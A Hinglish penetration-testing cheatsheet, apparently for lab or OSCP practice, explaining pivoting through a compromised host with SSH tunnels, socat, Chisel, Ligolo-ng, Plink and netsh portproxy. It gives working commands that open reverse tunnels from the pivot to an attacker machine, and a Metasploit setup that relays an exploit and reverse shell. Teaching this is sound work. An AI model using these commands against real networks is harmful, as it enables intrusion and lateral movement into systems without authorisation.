Pivoting & Port Forwarding

Jab koi port firewall se block ho ya direct access na ho to pivot host (ek compromised machine) ko jump box ki tarah use karke traffic forward karte hain. Yeh cheatsheet har technique ko detail mein explain karta hai — kab use karein, kya karta hai, aur har flag ka matlab kya hai.

01

SSH Tunnelling — Setup

OpenSSH ab Windows mein bhi by default aata hai, isliye yeh sabse common technique hai. Idea: PIVOT01 SSH client ki tarah kaam karta hai aur attacker ka machine SSH server hai. Attacker ki machine par ek restricted user banate hain jiske paas koi shell access nahi — sirf tunnelling ke liye.

Attacker box par restricted tunnel user banana

-s /bin/true flag ensure karta hai ki yeh user SSH se connect hone ke baad koi shell nahi chala sakta — sirf tunnel forward ho sakta hai. Yeh ek security measure hai.

ATTACKER BOX
useradd svc_tunnel -m -d /home/svc_tunnel -s /bin/true
passwd svc_tunnel          # strong, unique, throwaway password set karo
Note: Apna real password kabhi mat use karna is user ke liye — agar pivot host compromised hua to yeh password exposed ho jayega.

⚠ Troubleshoot — Setup stage

ProblemFix
sshd not runningsystemctl status ssh / systemctl start ssh on attacker box. On Windows pivot: Get-Service sshd then Start-Service sshd.
useradd: command not foundOn minimal/non-Debian systems use adduser instead, or check you're root.
PIVOT01 can't reach attacker SSH at allConfirm attacker's firewall allows inbound 22: ufw allow 22/tcp. Test with nc -zv <attacker-ip> 22 from pivot first.
02

SSH — Remote Port Forwarding (-R)

Pivot host (PIVOT01) ka koi reachable port attacker ki machine par "project" kar do. Matlab: PIVOT01 ek machine (DC01) tak pahunch sakta hai jo attacker directly nahi touch kar sakta — to PIVOT01 woh connection apni SSH tunnel se attacker tak forward kar deta hai.

Flow diagram

ATTACKER ←——————————————————————— PIVOT01 ————————→ DC01:3389 127.0.0.1:3389 (SSH tunnel) 10.10.10.7 # PIVOT01 apna access DC01 ka attacker tak le aata hai reverse SSH tunnel se

Command (PIVOT01 par chalao)

PIVOT01 (Windows/Linux)
ssh svc_tunnel@10.10.14.5 -R 3389:10.10.10.7:3389 -N
#      └── attacker IP   └── attacker par port   └── target IP:port

Har flag ka matlab

FlagMatlab
-R 3389:10.10.10.7:3389Remote forward. Attacker ke machine par port 3389 khulega. Us port par aane wala traffic PIVOT01 se through jaake DC01 ke port 3389 par jayega.
-NNo shell request. Sirf tunnel banao, koi interactive session mat kholo. Zaroori hai kyunki svc_tunnel user ke paas /bin/true shell hai.
svc_tunnel@10.10.14.5Attacker machine par SSH server se connect ho raha hai is restricted user se.

Ab attacker box se RDP connect karo

ATTACKER BOX
xfreerdp /v:127.0.0.1:3389 /u:admin /p:P@ssw0rd
# 127.0.0.1:3389 actually DC01 ka RDP hai tunnel ke through

⚠ Troubleshoot — Remote Forward (-R)

Error / SymptomCause & Fix
-R forward silently binds only to 127.0.0.1 on attackerBy default SSH servers only bind forwarded ports to localhost. Set GatewayPorts yes in /etc/ssh/sshd_config on the attacker box, then systemctl restart ssh, if you need the port reachable from other machines too.
channel 2: open failed: connect failed: Connection refusedPIVOT01 itself can't reach the final target:port. Test directly from PIVOT01 first: Test-NetConnection 10.10.10.7 -Port 3389 (Windows) or nc -zv 10.10.10.7 3389 (Linux).
remote port forwarding failed for listen port 3389Port already bound on the attacker side. Check with ss -tulpn | grep 3389 and either kill the conflicting process or pick a different forward port (e.g. 13389).
Permission denied (publickey,password)Confirm PasswordAuthentication yes is set in sshd_config if using a password, and that you're using the exact restricted username created earlier.
administratively prohibited: open failedSet AllowTcpForwarding yes in /etc/ssh/sshd_config on the attacker box — some hardened configs disable this by default.
03

SSH — Local Port Forwarding (-L)

Attacker machine ki koi service PIVOT01 par expose karo — taaki woh machines jo attacker tak directly nahi pahunch sakti, PIVOT01 ke through attacker ki service use kar sakein. Reverse shell receive karna ya malicious web server host karna iske common use cases hain.

Flow diagram

DC01 / FILESRV01 ————→ PIVOT01:80 ——————→ ATTACKER:80 # Internal machines attacker ki service tak PIVOT01 ke zariye pahunch sakti hain

Command (PIVOT01 par chalao)

PIVOT01 (Windows/Linux)
ssh svc_tunnel@10.10.14.5 -L *:80:127.0.0.1:80 -N
#                              └── PIVOT01 par  └── attacker machine ka port
#                                  *:80 matlab sab interfaces par listen karo

Har flag ka matlab

FlagMatlab
-L *:80:127.0.0.1:80Local forward. PIVOT01 ke sab network interfaces par port 80 listen karega. Wahan aane wala traffic attacker machine ke localhost:80 par jayega. * matlab all interfaces (0.0.0.0) — sirf 127.0.0.1 doge to sirf PIVOT01 khud use kar sakta hai.
127.0.0.1:80Attacker box ke perspective se — yeh attacker ka apna port 80 hai. 127.0.0.1 isliye kyunki attacker ki machine khud se connect karti hai.

Windows mein firewall rule (agar zaroori ho)

PIVOT01 (Admin CMD)
netsh advfirewall firewall add rule name="PivotPort80" dir=in action=allow protocol=TCP localport=80

⚠ Troubleshoot — Local Forward (-L)

Error / SymptomCause & Fix
bind: Address already in usePort 80 already taken on PIVOT01 (e.g. IIS running). Use a different listen port, e.g. -L *:8080:127.0.0.1:80.
Internal machines can connect to PIVOT01 but tunnel does nothingCheck Windows Firewall isn't blocking the listen port — add the netsh advfirewall rule shown above, and confirm you used *:80 not 127.0.0.1:80 (the latter only listens for connections from PIVOT01 itself).
Attacker-side service not receiving anythingConfirm the service is actually listening on the attacker box: ss -tulpn | grep :80. If it's bound to a specific interface instead of 127.0.0.1/0.0.0.0, the tunnel can't reach it.
04

SSH — Dynamic Port Forwarding (SOCKS Proxy)

Jab ek specific port nahi balki pura network scan/access karna ho to SOCKS proxy use karte hain. Ek port forward ke jagah yeh ek dynamic tunnel banata hai jisse kisi bhi IP:Port par route kar sako.

Reverse SOCKS (PIVOT01 se attacker tak — most common)

PIVOT01 (Windows/Linux)
ssh svc_tunnel@10.10.14.5 -R 9050 -N
# Attacker ke machine par port 9050 par SOCKS proxy shuru ho jata hai
# PIVOT01 ke through sara traffic route ho sakta hai

Normal SOCKS (jab attacker directly SSH kar sake pivot mein)

ATTACKER BOX
ssh svc_tunnel@10.10.10.5 -D 9050 -N
# PIVOT01 par direct SSH access ho to yeh use karo

proxychains configure karo

ATTACKER BOX — /etc/proxychains.conf
# File ke end mein [ProxyList] section update karo:
[ProxyList]
socks4  127.0.0.1  9050

Koi bhi tool SOCKS se chalao

ATTACKER BOX
proxychains curl http://internal.corp.redlab.local
proxychains nmap -sT -Pn -p 445,3389,80 10.10.10.6
proxychains python3 exploit.py
# nmap ke saath -sT (TCP connect) aur -Pn zaroori hai SOCKS se kaam karne ke liye

⚠ Troubleshoot — SOCKS / Dynamic Forward

Error / SymptomCause & Fix
proxychains: connect() timeoutThe SOCKS tunnel itself may not be up — confirm with ss -tulpn | grep 9050 that something is actually listening before blaming the target.
nmap gives empty/wrong results through proxychainsAlways add -sT -Pn — SYN scans and ICMP ping probes don't work over SOCKS, only full TCP connect scans do.
proxychains hangs for a long time per hostLower the timeouts in /etc/proxychains4.conf: tcp_read_time_out 4000 and tcp_connect_time_out 4000 (values in ms).
DNS names don't resolve through the tunnelAdd proxy_dns to proxychains4.conf so DNS lookups are also routed through SOCKS instead of resolving locally.
05

SSH — Multiple Forwards (Complex Exploit Tunnelling)

Kuch exploits ke liye ek saath kai ports forward karne padte hain — jaise Rejetto HFS exploit jisme RPORT (target ka port), SRVPORT (attacker ka web server) aur LPORT (reverse shell) teeno ko forward karna padta hai.

3-way tunnel ek command mein

PIVOT01 (Windows CMD)
ssh svc_tunnel@10.10.14.5 -R 8888:DC01.corp.redlab.local:80 -L *:6666:127.0.0.1:6666 -L *:7878:127.0.0.1:7878 -N
FlagPurposeMatlab
-R 8888:DC01:80RPORT (target)DC01 ka port 80 (vulnerable HFS) attacker ke port 8888 par forward. Attacker exploit ko 127.0.0.1:8888 par point karega.
-L *:6666:127.0.0.1:6666SRVPORT (web server)Attacker ka port 6666 (web server for payload) PIVOT01 ke port 6666 par expose. DC01 PIVOT01 tak pahunch sakta hai attacker tak nahi.
-L *:7878:127.0.0.1:7878LPORT (reverse shell)Attacker ka listener port 7878 PIVOT01 par expose. Reverse shell PIVOT01:7878 se aake SSH tunnel se attacker tak aata hai.

Metasploit settings (iske baad)

ATTACKER BOX — msfconsole
set rhosts 127.0.0.1       # DC01 ka tunnel attacker ke 8888 par hai
set rport 8888
set srvhost 127.0.0.1      # web server attacker pe, tunnel se DC01 tak jayega
set srvport 6666
set lhost PIVOT01.corp.redlab.local   # reverse shell PIVOT01 par connect karega
set ReverseListenerBindAddress 127.0.0.1  # listener attacker pe bind hoga
set lport 7878
06

socat

SSH available nahi hai ya simple single-port forward chahiye to socat best option hai. Disadvantage: binary upload karna padta hai pivot host par, jo detection ka risk badhata hai. Advantage: setup bahut simple hai, sirf ek command.

Basic syntax samjho

PIVOT01
socat TCP4-LISTEN:PORT,fork TCP4:TARGET_IP:TARGET_PORT
PartMatlab
TCP4-LISTEN:PORTPIVOT01 par yeh port par listen karo — incoming connections accept karo.
forkHar naye connection ke liye ek alag process fork karo — multiple connections handle ho sakein ek saath. Iske bina pehla connection close hote hi socat band ho jata hai.
TCP4:IP:PORTIncoming traffic ko is IP aur port par forward karo.

FILESRV01 ka RDP PIVOT01 ke through forward karna

PIVOT01 (Windows CMD)
C:\tools\socat\> socat TCP4-LISTEN:13389,fork TCP4:FILESRV01.corp.redlab.local:3389
# Port 3389 already PIVOT01 ki apni RDP service le raha hai, isliye 13389 use karo

Attacker box par web server PIVOT01 ke through expose karna

PIVOT01 (Windows CMD)
socat TCP4-LISTEN:80,fork TCP4:10.10.14.5:80
# Internal machines PIVOT01:80 par aayengi, jo traffic attacker:80 tak bhejega

Firewall rule add karo (Windows, agar zaroori ho)

PIVOT01 (Admin CMD)
netsh advfirewall firewall add rule name="Socat Pivot" dir=in action=allow protocol=TCP localport=13389

Ab attacker se connect karo

ATTACKER BOX
xfreerdp /v:PIVOT01.corp.redlab.local:13389 /u:admin /p:P@ssw0rd
# PIVOT01:13389 → socat → FILESRV01:3389

⚠ Troubleshoot — socat

Error / SymptomCause & Fix
'socat' is not recognized as an internal or external commandBinary wasn't actually uploaded, or you're not in the right directory — use the full path, e.g. C:\tools\socat\socat.exe.
Connection closes after exactly one clientYou forgot the ,fork option — without it socat exits after the first connection ends.
bind: Permission denied (listen port < 1024)On Linux, ports below 1024 need root. Use a high port instead (e.g. 8080) or run with sudo.
AV flags/deletes socat.exe on uploadGeneric network utilities get flagged by signature-based AV fairly often; this is expected behaviour of defensive tooling, not something to bypass — note it in your report as a detection opportunity for blue team.
07

Chisel

HTTP-based tunnelling tool — compiled Go binary, Windows aur Linux dono ke liye available. Firewalls jo SSH block karte hain woh aksar HTTP traffic allow karte hain, isliye yeh bahut useful hai modern environments mein. OSCP mein bhi commonly use hota hai.

Flow diagram

ATTACKER ←—————————————— HTTP tunnel ——————————————— PIVOT01 chisel server chisel client

Step 1: Attacker par chisel server chalao

ATTACKER BOX
./chisel server -p 8000 --reverse
# --reverse flag: pivot se reverse connections allow karta hai

Step 2: PIVOT01 par chisel client — single port forward

PIVOT01
./chisel client 10.10.14.5:8000 R:3389:10.10.10.6:3389
#                             └── R matlab reverse (attacker par port khulega)
#                                 3389:10.10.10.6:3389 = attacker:3389 → FILESRV01:3389

SOCKS proxy via chisel (pura subnet access)

PIVOT01
./chisel client 10.10.14.5:8000 R:socks
# Default SOCKS5 port: 1080 on attacker machine
ATTACKER BOX — /etc/proxychains.conf
socks5  127.0.0.1  1080

Chisel ke flag meanings

FlagMatlab
R:PORT:IP:PORTReverse forward — attacker ke machine par port khulega aur traffic pivot se target tak jayega.
R:socksReverse SOCKS5 proxy — attacker par 1080 par SOCKS listener shuru hota hai.
--reverseServer flag — reverse connections allow karta hai (client se R: prefix wale forwards ke liye zaroori).

⚠ Troubleshoot — Chisel

Error / SymptomCause & Fix
dial tcp: connection refusedServer isn't running, wrong port, or a firewall is in the way. Confirm with curl http://<attacker-ip>:8000 from the pivot — chisel server responds with a short banner even without a valid client.
client tries to reconnect forever, never succeedsUsually means --reverse was left off the server command — add it if the client is using R: forwards.
Architecture mismatch / "exec format error"You downloaded the wrong binary — match OS and CPU arch exactly (e.g. chisel_windows_amd64.exe vs chisel_linux_amd64).
Self-signed cert / fingerprint mismatch warningPin the expected fingerprint with --fingerprint <value> on the client once you've confirmed it out-of-band, to avoid MITM on the tunnel itself.

Ligolo-ng

Sabse advanced option — tun interface banata hai attacker ke machine par, jiski wajah se poora internal subnet routable ho jata hai. Nmap, RDP, SMB sab seedha IP se kaam karte hain bina proxychains ke. Alag-alag ports forward karne ki zaroorat nahi padti.

Step 1: Attacker par proxy server chalao

ATTACKER BOX
sudo ./proxy -selfcert
# -selfcert: self-signed certificate generate karta hai TLS ke liye
# Default listening port: 11601

Step 2: PIVOT01 par agent chalao

PIVOT01 (Windows/Linux)
./agent -connect 10.10.14.5:11601 -ignore-cert
# -ignore-cert: self-signed certificate warning ignore karo

Step 3: Attacker proxy console mein session setup

ATTACKER BOX — ligolo console
session              # connected agents list aayegi
1                    # agent select karo
start                # tunnel shuru karo

Step 4: Route add karo internal subnet ke liye

ATTACKER BOX (new terminal)
sudo ip route add 10.10.10.0/24 dev ligolo
# Ab attacker seedha 10.10.10.x range ko reach kar sakta hai
# bina kisi proxy ke — normal tools direct kaam karenge

ping 10.10.10.6          # test karo
nmap -sV 10.10.10.6      # seedha scan — no proxychains needed

⚠ Troubleshoot — Ligolo-ng

Error / SymptomCause & Fix
RTNETLINK answers: Operation not permittedThe ip route add step needs root — always run the route command with sudo on the attacker box.
No ligolo interface foundThe ./proxy process creates the ligolo tun interface only once a session has start-ed. Confirm with ip a | grep ligolo after starting the tunnel, not before.
x509: certificate signed by unknown authorityAdd -ignore-cert to the agent command — expected when using -selfcert on the proxy side.
Agent connects but Windows targets unreachableOn Windows pivots the agent needs the bundled wintun.dll in the same folder, and typically Administrator privileges to set up routing properly.
RTNETLINK answers: File existsA route to that subnet already exists (e.g. from a previous session). Remove it first: sudo ip route del 10.10.10.0/24, then re-add.

Plink (PuTTY CLI)

Plink PuTTY ka command-line SSH client hai. Jab Windows pivot par OpenSSH client na ho lekin PuTTY suite available ho to plink use karte hain. Iska behavior SSH ke -R flag jaisa hi hai.

Remote port forward (DC01 ka RDP attacker par)

PIVOT01 (Windows CMD)
plink.exe -ssh -l svc_tunnel -pw S3cur3T0k3n! 10.10.14.5 -R 3389:10.10.10.7:3389 -N
FlagMatlab
-sshSSH protocol use karo (plink telnet bhi support karta hai, isliye explicitly specify karo).
-l svc_tunnelSSH login username.
-pw PASSWORDPassword directly command line mein. Non-interactive environments mein kaam aata hai lekin process list mein visible hota hai.
-RSSH ke -R jaisa — remote port forwarding.
-NNo shell — sirf tunnel.
Tip: Plink pehli baar connect hone par host key prompt kar sakta hai. Non-interactive run ke liye pehle manually connect karke key accept karo, ya -batch flag use karo (auto-accept host key).

⚠ Troubleshoot — Plink

Error / SymptomCause & Fix
Plink hangs with no output, nothing happensIt's waiting on the host key prompt in a non-interactive context. Add -batch to auto-accept, or pre-seed the key by connecting once interactively.
FATAL ERROR: Network error: Connection timed outAttacker-side SSH server unreachable from PIVOT01 — check outbound firewall rules on the pivot and that the attacker's SSH port is actually open externally.
Access denied / password rejectedDouble-check the username/password, and confirm PasswordAuthentication yes is set on the attacker's sshd_config.
Process visible with plaintext password via tasklistExpected limitation of -pw — anyone with access to view running processes on PIVOT01 can see the password. Prefer key-based auth (-i key.ppk) where possible.

netsh portproxy (Windows Native)

Koi extra binary upload karne ki zaroorat nahi — Windows ka built-in netsh tool use karta hai. Jab kuch bhi upload nahi kar sakte pivot par to yeh best option hai. Admin privileges chahiye.

Port forward setup

PIVOT01 (Admin CMD)
netsh interface portproxy add v4tov4 listenport=13389 listenaddress=0.0.0.0 connectport=3389 connectaddress=10.10.10.6
ParameterMatlab
v4tov4IPv4 se IPv4 forward. v4tov6, v6tov4, v6tov6 bhi available hain.
listenport=13389PIVOT01 par yeh port incoming connections ke liye sun raha hoga.
listenaddress=0.0.0.0Sab interfaces par listen karo (0.0.0.0 = all).
connectport=3389Traffic is port par forward hoga target par.
connectaddress=10.10.10.6Target machine ka IP jahan traffic forward karna hai.

Manage karo

PIVOT01 (Admin CMD)
netsh interface portproxy show all           # active forwards dekho
netsh interface portproxy delete v4tov4 listenport=13389 listenaddress=0.0.0.0  # hatao

Firewall rule (Windows firewall enabled ho to)

PIVOT01 (Admin CMD)
netsh advfirewall firewall add rule name="PortProxy 13389" dir=in action=allow protocol=TCP localport=13389

⚠ Troubleshoot — netsh portproxy

Error / SymptomCause & Fix
Rule added but nothing forwardsThe "IP Helper" (iphlpsvc) service must be running for portproxy to work: sc query iphlpsvc, and sc start iphlpsvc if stopped.
Access is denied when adding the rulecmd.exe isn't elevated — reopen as Administrator (Run as administrator), portproxy requires admin rights.
Reachable locally but not from other machinesCheck the Windows Firewall rule actually exists and matches the port: netsh advfirewall firewall show rule name="PortProxy 13389".
Rule persists after reboot and causes conflicts laterportproxy rules survive reboots by default — always clean up with the delete v4tov4 command shown above once you're done.

Proxychains — Tools SOCKS se Route karna

SOCKS tunnel ke baad har tool ko proxy ke through route karne ke liye proxychains use hoti hai. Kisi bhi tool ke aage proxychains lagao bas.

Config file

ATTACKER BOX — /etc/proxychains4.conf (ya proxychains.conf)
# File ke end mein:
[ProxyList]
socks4  127.0.0.1  9050    # SSH dynamic / chisel SOCKS4
# ya
socks5  127.0.0.1  1080    # Chisel / Ligolo SOCKS5

Common tools ke saath proxychains

ATTACKER BOX
proxychains nmap -sT -Pn -p 80,443,445,3389 10.10.10.6   # -sT aur -Pn zaroori
proxychains curl http://10.10.10.7/
proxychains xfreerdp /v:10.10.10.6:3389 /u:admin /p:P@ss
proxychains python3 exploit.py
proxychains crackmapexec smb 10.10.10.0/24
proxychains evil-winrm -i 10.10.10.6 -u admin -p P@ssw0rd
nmap ke saath: -sT (TCP Connect scan) aur -Pn (ping skip) lagana zaroori hai — ICMP aur SYN packets SOCKS se nahi chalte. Results thoda slow aur altered aa sakte hain.

General Troubleshooting — Cross-Tool Diagnostics

Jab koi bhi tunnel kaam na kare, pehle in basic checks se guzro — zyadatar problems in 4 categories mein aati hain: tunnel process chal hi nahi raha, connectivity blocked hai, firewall rok raha hai, ya galat IP/port use ho raha hai.

Step 1 — Confirm the tunnel process is actually listening

Linux (attacker ya pivot)
ss -tulpn                    # sab listening ports + jo process use kar raha hai
ss -tulpn | grep 9050        # specific port check karo
netstat -tulpn               # ss available nahi to yeh purana alternative
Windows (pivot)
netstat -ano | findstr LISTENING
netstat -ano | findstr :3389
Get-NetTCPConnection -State Listen   # PowerShell alternative

Step 2 — Test raw connectivity before blaming the tool

Linux
nc -zv 10.10.10.7 3389      # port open hai ya nahi, bina kisi tool ke
curl -v telnet://10.10.10.7:3389   # agar nc available na ho
Windows
Test-NetConnection -ComputerName 10.10.10.7 -Port 3389
telnet 10.10.10.7 3389     # agar Test-NetConnection available na ho
Agar yeh Step 2 hi fail ho raha hai, to problem tunnel mein nahi hai — underlying network path hi block hai (firewall, ACL, ya target service down hai). Pehle isse fix karo.

Step 3 — Firewall checks (Windows pivot)

PIVOT01 (Admin CMD/PowerShell)
netsh advfirewall show allprofiles state         # firewall on/off hai
netsh advfirewall firewall show rule name=all | findstr "13389"   # specific rule check
Get-NetFirewallRule -DisplayName "*Pivot*"       # PowerShell alternative

Step 4 — Kill a stuck/zombie tunnel process

Linux
ps aux | grep ssh            # PID dhoondo
kill -9 <PID>
pkill -f "ssh.*-R.*9050"     # pattern se match karke kill
Windows
tasklist | findstr plink
taskkill /PID <PID> /F
taskkill /IM socat.exe /F

Common root causes — quick lookup

SymptomMost likely cause
"Connection refused" from attackerTunnel process not running, or wrong listen port — verify with Step 1 above.
"Connection timed out"A firewall somewhere in the path is silently dropping packets — most likely culprit when "refused" would at least respond.
Works with ping but not with the actual serviceICMP allowed but the specific TCP port is firewalled or the service isn't actually running on that port — confirm with Step 2.
Works once, then stopsTool without a "fork"/multi-connection option (plain socat without fork, or an SSH session without -f/autossh) died after the first connection closed.
Intermittent / slowUsually proxychains timeout settings too low for a congested or high-latency link — raise tcp_read_time_out / tcp_connect_time_out.

Quick Reference — Kab Kya Use Karein

Situation Tool Advantages Disadvantages
SSH client pivot par available hai (Win/Linux) SSH tunnelling Built-in, encrypted, flexible SSH client + server dono chahiye
SSH nahi, simple single port forward chahiye socat Simple syntax, ek command Binary upload karna padta hai
HTTP-only egress, SSH/raw TCP block Chisel HTTP se chalta hai, firewall bypass Binary upload karna padta hai
Pura subnet chahiye, multiple targets Ligolo-ng Full routing, no proxychains needed tun interface ke liye sudo chahiye
Windows, PuTTY available, no OpenSSH Plink PuTTY suite already present ho to Password command line mein visible
